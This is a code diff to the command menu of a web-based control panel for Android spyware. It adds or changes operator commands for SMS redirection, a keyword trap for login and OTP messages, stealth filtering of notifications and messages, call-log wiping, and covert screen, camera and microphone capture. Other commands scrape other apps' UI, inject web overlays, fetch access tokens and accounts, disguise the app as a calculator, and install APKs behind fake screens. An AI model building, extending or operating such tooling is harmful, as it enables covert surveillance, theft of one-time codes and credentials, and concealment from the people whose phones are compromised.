@@ -315,11 +315,12 @@
                 id: 'comm', 
                 label: 'Communications & Logs', 
                 css: 'sys', 
-                search: 'sms, calls, contacts, keywords, filter, hvt, redirection, forward, wipe, delete, sanitize',
+                search: 'sms, calls, contacts, keywords, filter, hvt, redirection, forward, wipe, delete, sanitize, auto, swipe',
                 commands: [
-                    { id: 'ADD_HVT_REDIRECT', name: 'SMS Redirection (HVT)', icon: '🔄', inputs: [{id: 'hvt-sender', label: 'Target Number', type: 'text'}, {id: 'hvt-dest', label: 'Destination', type: 'text'}] },
-                    { id: 'ADD_KEYWORD_FORWARD', name: 'Keyword SMS Trap', icon: '🪤', inputs: [{id: 'kw-list', label: 'Keywords (login,otp)', type: 'text'}, {id: 'kw-dest', label: 'Destination', type: 'text'}] },
-                    { id: 'SET_SMS_BLACKLIST', name: 'SMS Stealth Filter', icon: '🛡️', inputs: [{id: 'sms-blacklist', label: 'Filter Keywords', type: 'text'}] },
+                    { id: 'ADD_HVT_REDIRECT', name: 'SMS Redirection (HVT)', icon: '🔄', inputs: [{id: 'hvt-sender', label: 'Target Number', type: 'text'}, {id: 'hvt-dest', label: 'Destination', type: 'text'}], cleanup: 'CLEAR_HVT_REDIRECTS' },
+                    { id: 'ADD_KEYWORD_FORWARD', name: 'Keyword SMS Trap', icon: '🪤', inputs: [{id: 'kw-list', label: 'Keywords (login,otp)', type: 'text'}, {id: 'kw-dest', label: 'Destination', type: 'text'}], cleanup: 'CLEAR_KEYWORD_FORWARDS' },
+                    { id: 'ADD_AUTO_SWIPE', name: 'Stealth Content Filter', icon: '🕵️', inputs: [{id: 'swipe-type', label: 'Target', type: 'select', options: [{v: 'pkgs', l: 'App Package'}, {v: 'keywords', l: 'Keywords'}, {v: 'senders', l: 'Sender Number'}]}, {id: 'swipe-val', label: 'Value', type: 'text'}], cleanup: 'CLEAR_AUTO_SWIPE' },
+                    { id: 'SET_SMS_BLACKLIST', name: 'SMS Stealth List', icon: '🛡️', inputs: [{id: 'sms-blacklist', label: 'Filter Keywords', type: 'text'}] },
                     { id: 'WIPE_NOTIFICATIONS', name: 'Wipe Notifications', icon: '🧹', inputs: [{id: 'wipe-mode', label: 'Mode', type: 'select', options: [{v: 'ALL', l: 'All'}, {v: 'PKG', l: 'Package'}, {v: 'TEXT', l: 'Keyword'}]}, {id: 'wipe-val', label: 'Value (App or Word)', type: 'text'}] },
                     { id: 'PHONE_LOGS', name: 'Sanitize Call Logs', icon: '🧼', inputs: [{id: 'call-act', label: 'Action', type: 'select', options: [{v: 'CLEAR_ALL', l: 'Wipe All'}, {v: 'DELETE_LAST', l: 'Wipe Last'}, {v: 'DELETE_NUM', l: 'Wipe Number'}]}, {id: 'call-val', label: 'Value/Number', type: 'text'}] },
                     { id: 'ADD_CONTACT', name: 'Inject Contact', icon: '👤', inputs: [{id: 'con-name', label: 'Name', type: 'text'}, {id: 'con-num', label: 'Number', type: 'text'}] },
@@ -330,25 +331,24 @@
                 id: 'surv', 
                 label: 'Active Surveillance', 
                 css: 'surv', 
-                search: 'camera, mic, snapshot, audio, recording, screenshot, eyes, ears, environment, sensors',
+                search: 'camera, mic, snapshot, audio, recording, screenshot, eyes, ears, environment, sensors, scraper',
                 commands: [
                     { id: 'GET_SCREENSHOT', name: 'Capture Screen', icon: '📸', inputs: [{id: 'scr-quality', label: 'Quality %', type: 'number', val: 70}, {id: 'scr-freq', label: 'Freq (0=Single)', type: 'number', val: 0}, {id: 'scr-dur', label: 'Duration (s)', type: 'number', val: 0}] },
                     { id: 'RECORD_VOICE', name: 'Record Microphone', icon: '🎙️', inputs: [{id: 'mic-dur', label: 'Duration (Seconds)', type: 'number', val: 10}] },
                     { id: 'CAPTURE_IMAGE', name: 'Take Photos', icon: '📷', inputs: [{id: 'cam-side', label: 'Source', type: 'select', options: [{v: 'REAR', l: 'Rear'}, {v: 'FRONT', l: 'Front'}]}, {id: 'cam-count', label: 'Quantity', type: 'number', val: 1}] },
                     { id: 'GET_SENSORS', name: 'Sample Environment', icon: '🌡️', inputs: [] },
-                    { id: 'GET_TREE', name: 'UI Scraper (Hierarchy)', icon: '🌲', inputs: [{id: 'tree-pkg', label: 'Package Name', type: 'text', placeholder: 'com.pkg'}, {id: 'tree-dur', label: 'Duration (Min)', type: 'number', val: 1}] }
+                    { id: 'GET_TREE', name: 'UI Scraper (Hierarchy)', icon: '🌲', inputs: [{id: 'tree-pkg', label: 'Package Name', type: 'text', placeholder: 'com.pkg'}, {id: 'tree-dur', label: 'Duration (Min)', type: 'number', val: 1}], cleanup: 'RESET_SCRAPER' }
                 ]
             },
             {
                 id: 'remote', 
                 label: 'Remote Interaction', 
                 css: 'sys', 
-                search: 'wake, touch, brightness, screen, dimmer, ui, inject, intent, ghost, chain',
+                search: 'wake, touch, brightness, screen, dimmer, ui, inject, intent, ghost, chain, unblind',
                 commands: [
                     { id: 'REMOTE_TOUCH', name: 'Execute Touch Chain', icon: '⛓️', inputs: [{id: 'touch-json-raw', label: 'Chain JSON', type: 'textarea'}] },
-                    { id: 'BRIGHTNESS', name: 'Screen Dimmer / Stealth', icon: '🌓', inputs: [{id: 'bri-level', label: 'Level 0-100', type: 'number', val: 0}, {id: 'bri-method', label: 'Method', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth)'}, {v: 'OVERLAY', l: 'Overlay'}, {v: 'HARDWARE', l: 'Hardware'}]}] },
-                    { id: 'INJECT_UI', name: 'Inject Web Overlay', icon: '🖼️', inputs: [{id: 'ui-touchable', label: 'Input Mode', type: 'select', options: [{v: 'TRUE', l: 'Touchable'}, {v: 'FALSE', l: 'Ghost'}]}, {id: 'ui-html', label: 'HTML Content', type: 'textarea'}] },
-                    { id: 'REMOVE_UI', name: 'Kill Web Overlays', icon: '🚫', inputs: [] },
+                    { id: 'BRIGHTNESS', name: 'Screen Dimmer / Stealth', icon: '🌓', inputs: [{id: 'bri-level', label: 'Level 0-100', type: 'number', val: 0}, {id: 'bri-method', label: 'Method', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth)'}, {v: 'OVERLAY', l: 'Overlay'}, {v: 'HARDWARE', l: 'Hardware'}]}], cleanup: 'UNBLIND' },
+                    { id: 'INJECT_UI', name: 'Inject Web Overlay', icon: '🖼️', inputs: [{id: 'ui-touchable', label: 'Input Mode', type: 'select', options: [{v: 'TRUE', l: 'Touchable'}, {v: 'FALSE', l: 'Ghost'}]}, {id: 'ui-html', label: 'HTML Content', type: 'textarea'}], cleanup: 'REMOVE_UI' },
                     { id: 'WAKE', name: 'Force Screen Wake', icon: '💡', inputs: [{id: 'val-wake', label: 'Mode', type: 'select', options: [{v: 'standard', l: 'Standard'}, {v: 'wellbeing', l: 'Route Wellbeing'}]}] },
                     { id: 'RUN_INTENT', name: 'Trigger System Intent', icon: '⚡', inputs: [{id: 'int-act', label: 'Action', type: 'text', val: 'android.intent.action.VIEW'}, {id: 'int-data', label: 'URI/Data', type: 'text'}, {id: 'int-tgt', label: 'Target', type: 'select', options: [{v: 'activity', l: 'Activity'}, {v: 'service', l: 'Service'}, {v: 'broadcast', l: 'Broadcast'}]}] }
                 ]
@@ -357,13 +357,15 @@
                 id: 'sys_tools', 
                 label: 'System & Identity', 
                 css: 'sys', 
-                search: 'toast, speak, tts, volume, ping, token, accounts, numbers, battery, vitals',
+                search: 'toast, speak, tts, volume, ping, token, accounts, numbers, battery, vitals, ring, alarm',
                 commands: [
                     { id: 'TOAST', name: 'Show Toast Alert', icon: '💬', inputs: [{id: 'val-toast', label: 'Message', type: 'text'}] },
                     { id: 'SPEAK_TEXT', name: 'Speak Text (TTS)', icon: '🗣️', inputs: [{id: 'speak-text', label: 'Message', type: 'text'}, {id: 'speak-vol', label: 'Volume %', type: 'number', val: 80}] },
+                    { id: 'RING', name: 'Sonic Alarm', icon: '🔔', inputs: [{id: 'val-ring', label: 'Duration (Seconds)', type: 'number', val: 10}] },
                     { id: 'VOLUME', name: 'Set Audio Volume', icon: '🔊', inputs: [{id: 'vol-stream', label: 'Stream', type: 'select', options: [{v: 'RING', l: 'Ring'}, {v: 'MEDIA', l: 'Media'}, {v: 'ALARM', l: 'Alarm'}]}, {id: 'vol-level', label: 'Level (0-100 / SILENT)', type: 'text'}] },
                     { id: 'SCREEN_TIMEOUT', name: 'Set Screen Timeout', icon: '⏲️', inputs: [{id: 'val-timeout', label: 'Seconds', type: 'number', val: 30}] },
                     { id: 'PING', name: 'Send Connection Ping', icon: '📡', inputs: [] },
+                    { id: 'GET_TOKEN', name: 'Fetch Access Token', icon: '🔑', inputs: [] },
                     { id: 'GET_ACCOUNTS', name: 'Fetch Device Accounts', icon: '🆔', inputs: [] },
                     { id: 'GET_NUMBERS', name: 'Fetch SIM Hardware', icon: '📇', inputs: [] }
                 ]
@@ -385,10 +387,12 @@
                 id: 'maint', 
                 label: 'Maintenance & Stealth', 
                 css: 'sys', 
-                search: 'stay ready, interval, cycle, masquerade, skin, tile, promos, judas, logging',
+                search: 'stay ready, interval, cycle, masquerade, skin, tile, promos, judas, logging, feature, schedule',
                 commands: [
                     { id: 'STAY_READY', name: 'Burst Mode (Stay Ready)', icon: '🔥', inputs: [{id: 'val-burst', label: 'Duration (Minutes)', type: 'number', val: 15}] },
                     { id: 'SET_INTERVAL', name: 'Set Check-in Cycle', icon: '🔄', inputs: [{id: 'val-work', label: 'Minutes (Min 15)', type: 'number', val: 30}] },
+                    { id: 'TOGGLE_FEATURE', name: 'Parametric Feature Control', icon: '⚙️', inputs: [{id: 'tog-feat', label: 'Feature (e.g. location)', type: 'text'}, {id: 'tog-state', label: 'Mode', type: 'select', options: [{v: 'on', l: 'ON'}, {v: 'off', l: 'OFF'}, {v: 'sched', l: 'SCHED'}]}, {id: 'tog-p1', label: 'Mins / Start (00:00)', type: 'text'}, {id: 'tog-p2', label: 'End (23:59)', type: 'text'}] },
+                    { id: 'SET_TILE_STATE', name: 'Master Visibility Mode', icon: '👁️', inputs: [{id: 'val-tile-state', label: 'Mode', type: 'select', options: [{v: 'ON', l: 'Show Dashboard'}, {v: 'OFF', l: 'Masquerade'}]}] },
                     { id: 'TOGGLE_LOGGING', name: 'Toggle Live Debugger', icon: '🐞', inputs: [{id: 'log-state', label: 'State', type: 'select', options: [{v: 'ON', l: 'Logging ON'}, {v: 'OFF', l: 'Stealth OFF'}]}] },
                     { id: 'SET_MASQUERADE', name: 'Apply Stealth Skin', icon: '🎭', inputs: [{id: 'val-masquerade', label: 'App Mask', type: 'select', options: [{v: 'DRIVE', l: 'Drive Services'}, {v: 'CALC', l: 'Calculator'}]}] },
                     { id: 'SET_JUDAS_HANDLER', name: 'Emergency SMS Fallback', icon: '📞', inputs: [{id: 'judas-handler', label: 'Phone Number', type: 'text'}] },
@@ -404,7 +408,7 @@
                     { id: 'PUSH_FILE', name: 'Deploy File to Device', icon: '📤', inputs: [{id: 'push-url', label: 'Source URL', type: 'text'}, {id: 'push-path', label: 'Target Path', type: 'text'}] },
                     { id: 'PULL_FILE', name: 'Download File from Device', icon: '📥', inputs: [{id: 'val-pull', label: 'Remote Path', type: 'text'}] },
                     { id: 'GET_SKELETON', name: 'Scan File Structure', icon: '🦴', inputs: [{id: 'val-skeleton', label: 'Depth (1-10)', type: 'number', val: 5}] },
-                    { id: 'INSTALL_APP', name: 'Remote App Installer', icon: '📦', inputs: [{id: 'install-path', label: 'APK Path', type: 'text'}, {id: 'install-html', label: 'Fake Screen HTML', type: 'textarea'}] }
+                    { id: 'INSTALL_APP', name: 'Remote App Installer', icon: '📦', inputs: [{id: 'install-path', label: 'APK Path', type: 'text'}, {id: 'install-html', label: 'Fake Screen HTML', type: 'textarea'}], cleanup: 'STOP_INSTALL' }
                 ]
             },
             {
@@ -458,7 +462,8 @@
                                     </div>
                                     <div class="cmd-actions">
                                         <button class="btn" style="flex:1; background:var(--primary); color:#000;" onclick="sendCmd('${cmd.id}')">BROADCAST</button>
-                                        <button class="btn danger" style="padding:8px 15px;" onclick="toggleCmdDrawer('${cmd.id}')">CANCEL</button>
+                                        ${cmd.cleanup ? `<button class="btn danger" style="padding:8px 10px; font-size:0.6rem;" onclick="sendCmd('${cmd.cleanup}')">WIPE/RESET</button>` : ''}
+                                        <button class="btn" style="padding:8px 15px; border-color:#333;" onclick="toggleCmdDrawer('${cmd.id}')">CLOSE</button>
                                     </div>
                                 </div>
                             </div>
